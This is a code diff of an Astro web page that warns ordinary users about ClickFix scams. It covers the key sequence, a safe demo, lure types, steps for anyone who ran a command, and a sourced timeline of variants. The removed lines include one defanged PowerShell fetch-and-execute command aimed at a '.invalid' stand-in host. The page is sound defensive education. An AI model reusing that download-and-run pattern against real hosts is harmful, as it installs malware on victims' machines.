@@ -1,221 +1,350 @@
 ---
 import Layout from "../layouts/Layout.astro";
 import Header from "../components/Header.astro";
-import InteractiveDemo from "../components/Demo.astro";
-import NewsComponent from "../components/News.astro";
+import Footer from "../components/Footer.astro";
+import Demo from "../components/Demo.astro";
+import Lures from "../components/Lures.astro";
+
+const reviewed = "November 2026";
+
+const keys = [
+  { caps: ["Win", "R"], does: "opens the Run box" },
+  { caps: ["Ctrl", "V"], does: "pastes the attacker’s command" },
+  { caps: ["Enter"], does: "runs it" },
+];
+
+const timeline = [
+  {
+    when: "Early 2024",
+    name: "ClickFix appears",
+    what: "Fake Word and Chrome errors; PowerShell pasted into Run.",
+    source: "Proofpoint",
+    url: "https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape",
+  },
+  {
+    when: "Late 2024",
+    name: "State hackers try it",
+    what: "Russia’s APT28, North Korea’s Kimsuky, Iran’s MuddyWater.",
+    source: "Proofpoint",
+    url: "https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix",
+  },
+  {
+    when: "Jun 2025",
+    name: "FileFix",
+    what: "Command disguised as a file path, pasted into File Explorer.",
+    source: "Kaspersky",
+    url: "https://www.kaspersky.com/blog/filefix-attack-windows-file-explorer/54752/",
+  },
+  {
+    when: "Jun 2025",
+    name: "Macs targeted",
+    what: "A campaign delivers Atomic Stealer to macOS users.",
+    source: "Microsoft",
+    url: "https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/",
+  },
+  {
+    when: "Dec 2025",
+    name: "ConsentFix",
+    what: "Victim pastes back an OAuth sign-in URL. Account takeover, no malware.",
+    source: "Push Security",
+    url: "https://pushsecurity.com/blog/consentfix-debrief",
+  },
+  {
+    when: "Jan 2026",
+    name: "CrashFix",
+    what: "Fake extension crashes the browser; the “fix” abuses <code>finger.exe</code>.",
+    source: "Microsoft",
+    url: "https://www.microsoft.com/en-us/security/blog/2026/02/05/clickfix-variant-crashfix-deploying-python-rat-trojan/",
+  },
+  {
+    when: "Feb 2026",
+    name: "Windows Terminal",
+    what: "<kbd>Win</kbd> + <kbd>X</kbd>, <kbd>I</kbd> instead of Run, dodging Run-box policies.",
+    source: "SecurityWeek",
+    url: "https://www.securityweek.com/clickfix-attack-uses-windows-terminal-to-evade-detection/",
+  },
+  {
+    when: "Mar 2026",
+    name: "macOS warns",
+    what: "Tahoe 26.4 flags commands pasted into Terminal from the web.",
+    source: "MacRumors",
+    url: "https://www.macrumors.com/2026/06/16/apple-details-terminal-anti-scam-warning-in-macos/",
+  },
+  {
+    when: "Oct 2026",
+    name: "Cache smuggling",
+    what: "Payload pre-loaded into the browser cache; no download event.",
+    source: "iTnews",
+    url: "https://www.itnews.com.au/news/microsoft-spots-new-twist-on-clickfix-cache-smuggling-629401",
+  },
+];
 ---
 
-<Layout title="ClickFix: from fake CAPTCHA to command execution — ClickFix.fyi" description="A working ClickFix demo, an explanation of the attack, and steps to take if you ran the command.">
+<Layout
+  title="ClickFix: no real website will ask you to press these keys"
+  description="ClickFix pages trick you into pasting a command that installs malware. Try a safe demo, see what the trap looks like, and what to do if you ran one."
+>
   <Header />
 
-  <main id="main-content" class="docs-layout container">
-    <aside class="docs-nav" aria-label="On this page">
-      <p>On this page</p>
-      <nav>
-        <a href="#demo">Demo</a>
-        <a href="#how-it-works">How it works</a>
-        <a href="#common-prompts">Common fake prompts</a>
-        <a href="#already-ran-it">If you ran it</a>
-        <a href="#sources">News</a>
-      </nav>
-    </aside>
+  <main id="main">
+    <section class="hero wrap" aria-labelledby="hero-title">
+      <h1 id="hero-title">No real website will ask you to press these keys.</h1>
 
-    <article class="docs-article">
-      <header class="article-header" id="overview">
-        <h1>ClickFix: from fake CAPTCHA to command execution</h1>
-        <p class="article-summary">
-          ClickFix is a social engineering technique that uses fake CAPTCHAs or error messages to trick someone into copying and running a command. The command typically downloads malware.
+      <ol class="keys" aria-label="The key sequence a ClickFix page asks for">
+        {keys.map((step) => (
+          <li>
+            <span class="caps">
+              {step.caps.map((cap, i) => (
+                <>
+                  {i > 0 && <span class="plus" aria-hidden="true">+</span>}
+                  <kbd class="cap">{cap}</kbd>
+                </>
+              ))}
+            </span>
+            <span class="does">{step.does}</span>
+          </li>
+        ))}
+      </ol>
+
+      <div class="measure">
+        <p class="lead">
+          If a page asks you to, close it. It’s a scam called ClickFix: those keys run a command that installs malware.
         </p>
-        <p class="demo-intro">The interactive demo below reproduces this sequence using a harmless script.</p>
-      </header>
+        <p class="mac-note">On a Mac it’s Terminal and <kbd>⌘</kbd> + <kbd>V</kbd>. Same scam.</p>
+        <p class="hero-links">
+          <a class="go" href="#demo">Try a safe demo</a>
+          <a class="urgent" href="#ran-it">Ran a command? Do this now</a>
+        </p>
+      </div>
+    </section>
 
-      <section id="demo" class="demo-section">
-        <InteractiveDemo />
-      </section>
+    <section class="block wrap" id="demo" aria-labelledby="demo-title">
+      <h2 id="demo-title">See how it works</h2>
+      <p class="measure">A fake page and a harmless command. Nothing gets downloaded.</p>
+      <Demo />
+    </section>
 
-      <section id="how-it-works">
-        <h2>How it works</h2>
-        <p>ClickFix is a way to deliver malware, not a specific piece of malware. What gets installed varies between campaigns.</p>
-        <ol class="sequence detailed-sequence">
-          <li><div><strong>The page shows a fake prompt.</strong><p>A malicious or compromised page displays a familiar CAPTCHA, browser error, meeting problem, or document error.</p></div></li>
-          <li><div><strong>The button copies a command.</strong><p>The button claims to copy a verification code or fix. It copies a command instead.</p></div></li>
-          <li><div><strong>The user opens a system tool.</strong><p>The page directs the user to open Run, PowerShell, Terminal, Command Prompt, or File Explorer.</p></div></li>
-          <li><div><strong>The user runs the command.</strong><p>The system tool executes whatever the attacker placed on the clipboard.</p><pre aria-label="Defanged example ClickFix command"><code>powershell.exe -NoProfile -WindowStyle Hidden -Command "irm https://secure-check.example.invalid/update.ps1 | iex"</code></pre><small>The reserved <code>.invalid</code> domain cannot resolve, so this example cannot download a payload.</small></div></li>
-          <li><div><strong>The command downloads malware.</strong><p>The downloaded malware then runs on the device.</p></div></li>
-        </ol>
+    <section class="block wrap" id="looks" aria-labelledby="looks-title">
+      <h2 id="looks-title">What it looks like</h2>
+      <p class="measure">The disguise changes. The ask doesn’t: copy something, paste it into your computer.</p>
+      <Lures />
+    </section>
 
-      </section>
-
-      <section id="common-prompts">
-        <h2>Common fake prompts</h2>
-        <ul class="disguise-list">
-          <li>“Verify you are human”</li>
-          <li>“Your browser needs an update”</li>
-          <li>“The document cannot be displayed”</li>
-          <li>“Your microphone or meeting connection failed”</li>
+    <section class="ran" id="ran-it" aria-labelledby="ran-title">
+      <div class="wrap">
+        <h2 id="ran-title">If you ran it, your computer is compromised</h2>
+        <ul class="ran-list measure">
+          <li><strong>Work computer:</strong> disconnect it from the network and call IT now.</li>
+          <li>
+            <strong>Personal computer:</strong> from another device, change your passwords and sign out of all
+            devices (the attacker may have your logged-in sessions), then reset the computer.
+          </li>
         </ul>
-      </section>
+      </div>
+    </section>
 
-      <section id="already-ran-it">
-        <h2>If you ran the command</h2>
-        <div class="warning compact" role="note">
-          <strong>Treat the device as compromised.</strong>
-        </div>
-        <ol class="response-list">
-          <li><strong>Disconnect the affected computer.</strong> Turn off Wi-Fi and unplug the network cable.</li>
-          <li><strong>Secure your accounts.</strong> From another device, sign out active sessions and change credentials that may have been exposed.</li>
-          <li><strong>Clean or rebuild the device.</strong> A clean antivirus scan does not prove the malware is gone. Reinstall the operating system or have the device inspected.</li>
-        </ol>
-      </section>
+    <section class="block wrap tech" id="timeline" aria-labelledby="timeline-title">
+      <h2 id="timeline-title">Timeline</h2>
 
-      <section id="sources">
-        <h2>ClickFix news</h2>
-        <NewsComponent />
-      </section>
-    </article>
+      <div class="table-scroll" role="region" aria-label="ClickFix timeline" tabindex="0">
+        <table class="timeline">
+          <tbody>
+            {timeline.map((row) => (
+              <tr>
+                <td class="when">{row.when}</td>
+                <td>
+                  <strong>{row.name}.</strong> <span set:html={row.what} />
+                </td>
+                <td class="src"><a href={row.url} rel="noopener noreferrer">{row.source}</a></td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </div>
+
+      <p class="measure more">
+        For mitigations and hunting queries, see <a href="https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/" rel="noopener noreferrer">Microsoft’s ClickFix analysis</a>.
+      </p>
+    </section>
+
   </main>
+
+  <Footer reviewed={reviewed} />
 </Layout>
 
 <style>
-  .docs-layout {
+  /* ---------- Hero ---------- */
+  .hero {
+    padding-block: clamp(2.5rem, 8vw, 6rem) clamp(2rem, 6vw, 4rem);
+  }
+
+  .hero h1 {
+    max-width: 15ch;
+  }
+
+  .keys {
+    display: flex;
+    flex-wrap: wrap;
+    gap: clamp(1.25rem, 3vw, 2.75rem);
+    margin-block: clamp(2rem, 5vw, 3.5rem);
+    padding: 0;
+    list-style: none;
+  }
+
+  .keys li {
     display: grid;
-    grid-template-columns: 190px minmax(0, 900px);
-    gap: clamp(3rem, 8vw, 7rem);
-    justify-content: center;
-    padding-block: 3rem 6rem;
+    align-content: start;
+    gap: 0.75rem;
+    justify-items: start;
   }
 
-  .docs-nav {
-    position: sticky;
-    top: 104px;
-    align-self: start;
-    border-left: 1px solid var(--line);
-    padding-left: 1rem;
+  .caps {
+    display: flex;
+    gap: 0.5rem;
+    align-items: center;
   }
 
-  .docs-nav > p {
-    margin-bottom: 0.7rem;
-    color: var(--ink);
-    font-size: 0.78rem;
-    font-weight: 700;
+  .cap {
+    min-width: 2.4em;
+    border: 2px solid var(--ink);
+    border-bottom-width: 7px;
+    border-radius: 12px;
+    padding: 0.3em 0.55em 0.25em;
+    background: var(--paper);
+    font-size: clamp(1.4rem, 4vw, 2.6rem);
+    font-weight: 600;
+    line-height: 1.1;
   }
 
-  .docs-nav nav {
-    display: grid;
-    gap: 0.55rem;
+  .plus {
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: clamp(1.1rem, 2.5vw, 1.6rem);
   }
 
-  .docs-nav a {
-    color: var(--ink-soft);
-    font-size: 0.82rem;
+  .does {
+    max-width: 15rem;
+    color: var(--muted);
+    font-family: var(--ui);
+    font-size: 0.95rem;
     line-height: 1.35;
-    text-decoration: none;
   }
 
-  .docs-nav a:hover { color: var(--signal); }
-
-  .docs-article { min-width: 0; }
-
-  .article-header {
-    padding-bottom: 0;
+  .lead {
+    font-size: clamp(1.2rem, 2.2vw, 1.45rem);
+    line-height: 1.5;
   }
 
-  .article-header h1 {
-    margin-bottom: 1rem;
-    font-size: clamp(2.3rem, 5vw, 3.75rem);
+  .mac-note {
+    margin-top: 1rem;
+    color: var(--muted);
   }
 
-  .article-summary {
-    max-width: 44rem;
-    margin: 0;
-    color: var(--ink-soft);
-    font-size: clamp(1.05rem, 1.8vw, 1.2rem);
-    line-height: 1.55;
-  }
-
-  .demo-intro {
-    max-width: 44rem;
-    margin: 0.85rem 0 0;
-    color: var(--ink-soft);
-    font-size: clamp(1.05rem, 1.8vw, 1.2rem);
-    line-height: 1.55;
-  }
-
-  .docs-article section {
-    padding-block: 2.75rem;
-    border-bottom: 1px solid var(--line);
-    scroll-margin-top: 100px;
-  }
-
-  .docs-article .demo-section { padding-top: 1.5rem; }
-
-  .docs-article section h2 {
-    margin-bottom: 1rem;
-    font-size: clamp(1.65rem, 3vw, 2.15rem);
-  }
-
-  .docs-article section > p,
-  .docs-article li {
-    color: var(--ink-soft);
+  .hero-links {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.75rem 1.5rem;
+    align-items: center;
+    margin-top: 2rem;
+    font-family: var(--ui);
     font-size: 1rem;
   }
 
-  .warning {
-    margin-block: 2rem;
-    border: 1px solid #d8a6a0;
-    border-left: 5px solid var(--signal);
-    padding: 1.1rem 1.25rem;
-    background: #fff5f4;
+  .go {
+    border-radius: 8px;
+    padding: 0.8rem 1.2rem;
+    background: var(--ink);
+    color: var(--paper);
+    font-weight: 600;
+    text-decoration: none;
   }
 
-  .warning strong { color: var(--signal-dark); }
-  .warning p { margin: 0.35rem 0 0; color: var(--ink-soft); }
-  .warning.compact { margin-block: 1.25rem 1.75rem; }
-
-  .sequence {
-    margin: 1.5rem 0;
-    padding: 0;
-    list-style: none;
-    counter-reset: step;
+  .go:hover {
+    background: #343a42;
   }
 
-  .sequence li {
+  .urgent {
+    color: var(--stop);
+    font-weight: 600;
+  }
+
+  /* ---------- Sections ---------- */
+  .block {
+    padding-top: clamp(3.5rem, 9vw, 6.5rem);
+    scroll-margin-top: 1rem;
+  }
+
+  .block > h2,
+  .ran h2 {
+    margin-bottom: 1.25rem;
+  }
+
+  .block > h3 {
+    margin: 3rem 0 1rem;
+  }
+
+  /* ---------- If you ran it ---------- */
+  .ran {
+    margin-top: clamp(3.5rem, 9vw, 6.5rem);
+    padding-block: clamp(2.5rem, 7vw, 4.5rem);
+    background: var(--stop-wash);
+    scroll-margin-top: 0;
+  }
+
+  .ran h2 {
+    color: var(--stop-deep);
+  }
+
+  .ran-list {
     display: grid;
-    grid-template-columns: 2rem minmax(0, 1fr);
-    gap: 0.8rem;
-    padding: 1rem 0;
-    counter-increment: step;
+    gap: 0.75rem;
+    padding-left: 1.2rem;
+    font-size: 1.15rem;
   }
 
-  .sequence li > div { min-width: 0; }
-
-  .sequence li + li { border-top: 1px solid #d9dee1; }
-  .sequence li::before { content: counter(step) "."; color: var(--signal); font-family: var(--font-mono); font-weight: 700; }
-  .sequence strong { color: var(--ink); }
-  .sequence p { margin: 0.25rem 0 0; }
-
-  .detailed-sequence small { display: block; margin-top: 0.45rem; color: var(--ink-soft); }
-  pre { overflow-x: auto; margin: 0.9rem 0 0; border: 1px solid #3b4348; border-radius: 4px; padding: 0.9rem; background: #171c20; color: #e8ecee; }
-  pre code { padding: 0; background: transparent; }
-  .disguise-list { margin: 1.4rem 0 0; padding-left: 1.25rem; }
-  .disguise-list li { margin-bottom: 0.65rem; }
-
-  .response-list { padding-left: 1.35rem; }
-  .response-list li { margin-bottom: 0.9rem; padding-left: 0.3rem; }
-  .response-list strong { color: var(--ink); }
-
-  .docs-article section:last-child { border-bottom: 0; }
-
-  @media (max-width: 800px) {
-    .docs-layout { grid-template-columns: 1fr; gap: 0; padding-top: 2rem; }
-    .docs-nav { display: none; }
+  /* ---------- Technical ---------- */
+  .more {
+    margin-top: 2rem;
   }
 
-  @media (max-width: 520px) {
-    .docs-layout { padding-bottom: 3rem; }
-    .article-header h1 { font-size: 2rem; line-height: 1.08; }
-    .article-summary,
-    .demo-intro { font-size: 1rem; }
-    .docs-article section { padding-block: 2.25rem; }
+  .table-scroll {
+    overflow-x: auto;
   }
+
+  .timeline {
+    width: 100%;
+    min-width: 40rem;
+    border-collapse: collapse;
+    font-size: 1rem;
+    line-height: 1.5;
+  }
+
+  .timeline th {
+    border-bottom: 2px solid var(--ink);
+    padding: 0 1rem 0.5rem 0;
+    font-family: var(--ui);
+    font-size: 0.875rem;
+    font-weight: 600;
+    text-align: left;
+  }
+
+  .timeline td {
+    border-bottom: 1px solid var(--rule);
+    padding: 0.85rem 1.25rem 0.85rem 0;
+    vertical-align: top;
+  }
+
+  .timeline .when {
+    width: 9rem;
+    font-family: var(--ui);
+    font-size: 0.9rem;
+    white-space: nowrap;
+  }
+
+  .timeline .src {
+    width: 13rem;
+    font-family: var(--ui);
+    font-size: 0.9rem;
+  }
+
 </style>
